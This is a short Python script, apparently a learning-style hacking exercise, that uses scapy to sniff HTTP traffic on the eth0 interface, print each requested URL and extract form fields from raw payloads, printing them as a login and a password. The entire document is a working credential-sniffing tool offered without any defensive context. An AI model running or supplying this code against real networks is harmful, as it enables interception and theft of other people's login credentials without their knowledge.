import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http request: " + str(url))

        if packet.haslayer(scapy.Raw):
            data = str(packet[scapy.Raw].load.decode('utf-8'))
            data = data.split("&")

            login = data[0].split("=")[1]
            password = data[1].split("=")[1]

            print("[+] LOGIN: " + login)
            print("[+] PASSWORD: " + password)


sniff('eth0')
